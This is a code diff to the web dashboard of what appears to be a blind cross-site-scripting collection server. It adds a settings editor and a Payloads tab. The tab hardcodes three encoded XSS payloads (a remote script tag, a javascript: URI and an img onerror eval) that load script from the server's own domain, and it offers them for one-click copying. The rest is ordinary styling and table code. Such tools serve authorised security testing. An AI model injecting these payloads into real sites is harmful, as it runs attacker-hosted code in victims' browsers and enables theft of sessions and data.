@@ -20,6 +20,20 @@
             text-align: left;
         }
 
+        input[type="text"] {
+            padding: 10px;
+            margin-bottom: 20px;
+            border: none;
+            border-radius: 5px;
+            width: 97%;
+        }
+
+        .value_cell {
+            width: 85%;
+        }
+
+
+
         .navbar {
             border-radius: 10px;
             background-color: #4CAF50;
@@ -108,6 +122,44 @@
             border-bottom: 1px solid #dee2e6;
         }
 
+        .settings_row {
+            background-color: #f8f9fa;
+        }
+
+        .settings_row:nth-child(odd) {
+            background-color: #fefefe;
+        }
+
+        .settings_row:nth-child(even) {
+            background-color: #f1f3f5;
+        }
+
+        .settings_cell {
+            padding: 10px;
+            border-bottom: 1px solid #dee2e6;
+        }
+
+        .payload_div {
+            padding: 10px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #dee2e6;
+        }
+
+        .payload_title {
+            font-weight: bold;
+        }
+
+        .payload_description {
+            padding-bottom: 10px;
+        }
+
+        .payload_code {
+            padding: 10px;
+            border: 1px solid #dee2e6;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
         .modal_element_div {
             padding-top: 4px;
             padding-bottom: 4px;
@@ -159,9 +211,21 @@
     </div>
     <div id="settings" hidden>
         <h1>Settings</h1>
+        <form id="settings_form">
+            <table id="settingsTable">
+                <tr>
+                    <th>Key</th>
+                    <th>Value</th>
+                </tr>
+            </table>
+            <input class="action_button" type="submit" value="Save">
+        </form>
     </div>
     <div id="payloads" hidden>
-        <h1>Payloads</h1>
+        <h1 style="margin-bottom:0px;">Payloads</h1>
+        <h3 style="margin:0px;">(Click Desired Payload to Copy to Clipboard)</h3>
+        <div id="payloadsTable">
+        </div>
     </div>
     <script>
         function loadPayloadFires() {
@@ -232,6 +296,89 @@
             // });
         }
 
+        function loadSettings() {
+            if (state.settings) {
+                return;
+            }
+            state.settings = 1;
+            fetch('/api/v1/settings', {
+                method: 'GET',
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                const table = document.getElementById('settingsTable');
+                for (const [key, value] of Object.entries(data)) {
+                    state.settings_form[key] = value;
+                    if (key === 'SEND_ALERTS') {
+                        state.settings_form[key] = value === 'true';
+                    }
+                    const row = make_table_row(table, 'settings_row');
+                    make_settings_table_cell(row, key, value, 'settings_cell');
+                }
+            });
+        }
+
+        document.getElementById('settings_form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            var inputs = document.getElementById('settingsTable').getElementsByTagName('input');
+            for (var i = 0; i < inputs.length; i++) {
+                var form_data = new FormData();
+                var input = inputs[i];
+                var value = input.type === 'checkbox' ? input.checked : input.value;
+                if (state.settings_form[input.id] === value) {
+                    continue;
+                }
+                form_data.append('key', input.id);
+                form_data.append('value', value);
+                fetch('/api/v1/settings', {
+                    method: 'PUT',
+                    body: form_data
+                })
+            }
+        });
+
+        function makePayloadsTable() {
+            if (state.payloads) {
+                return;
+            }
+            state.payloads = 1;
+            var payloadsTable = document.getElementById('payloadsTable');
+            var payloads = [
+                { title: 'Basic Payload', description: 'This is a basic payload', payload: '%3Cscript%20src%3D%27/script_domain/%27%3E%3C%2Fscript%3E' },
+                { title: 'Javascript URI', description: 'This is a payload that uses a javascript URI', payload: 'javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%5C%27script%5C%5C%27%29%3Ba.src%3D%5C%5C%27/script_domain/%5C%5C%27%3Bdocument.body.appendChild%28a%29%27%29' },
+                { title: 'HTML Injection', description: 'This is a payload that uses HTML injection', payload: '%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28this.id%29%29%20id%3D%22/script_base64/%22%3E' },
+            ]
+
+            payloads.forEach(payload => {
+                var domain = window.location.origin;
+                var domainWithoutProtocol = window.location.hostname + (window.location.port ? ':' + window.location.port : '');
+                var domainBase64 = html_encode(btoa(domain));
+                var processedPayload = payload.payload.replace('/script_domain/', domain);
+                processedPayload = processedPayload.replace('/script_hostname/', domainWithoutProtocol);
+                processedPayload = processedPayload.replace('/script_base64/', domainBase64);
+
+                var URIPayload = decodeURIComponent(processedPayload);
+                var payloadDiv = make_div('payload_div', payloadsTable);
+                make_element('h2', payload.title, payloadDiv, 'payload_title');
+                make_element('p', payload.description, payloadDiv, 'payload_description');
+                make_element('code', URIPayload, payloadDiv, 'payload_code', function() {
+                    copyToClipboard(URIPayload);
+                });
+            });
+        }
+        
+        function copyToClipboard(text) {
+            var textArea = document.createElement("textarea");
+            textArea.value = text;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+        }
+
         function loadCollectedPages() {
             fetch('/api/v1/collected_pages', {
                 method: 'GET',
@@ -280,6 +427,13 @@
     </script>
 
     <script>
+        var state = {
+            payload_fires: 1,
+            collected_pages: 0,
+            settings: 0,
+            payloads: 0,
+            settings_form: {},
+        };
         function navbar(page) {
             document.getElementById('payload_fires').hidden = true;
             document.getElementById('collected_pages').hidden = true;
@@ -293,9 +447,11 @@
                     document.getElementById('collected_pages').hidden = false;
                     break;
                 case 'settings':
+                    loadSettings();
                     document.getElementById('settings').hidden = false;
                     break;
                 case 'payloads':
+                    makePayloadsTable();
                     document.getElementById('payloads').hidden = false;
                     break;
                 default:
@@ -361,6 +517,30 @@
             return row;
         }
 
+        function make_editable_table_cell(value, key, row, is_bool, style_class = null) {
+            var cell = row.insertCell();
+            var input = document.createElement('input');
+        
+            input.type = is_bool ? 'checkbox' : 'text';
+            if (is_bool) {
+                input.checked = value === 'true';
+            } else {
+                input.value = value;
+            }
+            input.id = key;
+            cell.appendChild(input);
+            if (style_class) {
+                cell.className = style_class;
+            }
+            return cell;
+        }
+
+        function make_settings_table_cell(row, key, value, style_class = null) {
+            var key_cell = make_table_cell(key, row, `${style_class} key_cell`);
+            var is_bool = key === 'SEND_ALERTS';
+            var value_cell = make_editable_table_cell(value, key, row, is_bool, `${style_class} value_cell`);
+        }
+
         function make_table_cell(text, row, style_class = null) {
             var cell = row.insertCell();
             cell.textContent = text;
@@ -368,6 +548,10 @@
                 cell.className = style_class;
             }
             return cell;
+        }
+
+        function html_encode(value){
+            return String(value).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace( /=/g, '&#61;' ).replace( / /g, '&#32;' );
         }
     </script>
 </body>
